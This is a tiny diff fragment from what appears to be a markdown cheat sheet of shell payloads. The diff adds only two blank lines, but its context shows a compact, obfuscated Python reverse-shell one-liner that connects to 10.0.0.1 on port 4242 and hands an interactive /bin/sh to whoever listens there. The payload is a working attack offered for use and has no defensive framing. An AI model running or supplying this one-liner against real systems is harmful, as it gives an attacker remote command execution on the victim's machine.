@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:25:25.998104+00:00'
 ```python
 python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.0.0.1",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
 ```
+
+
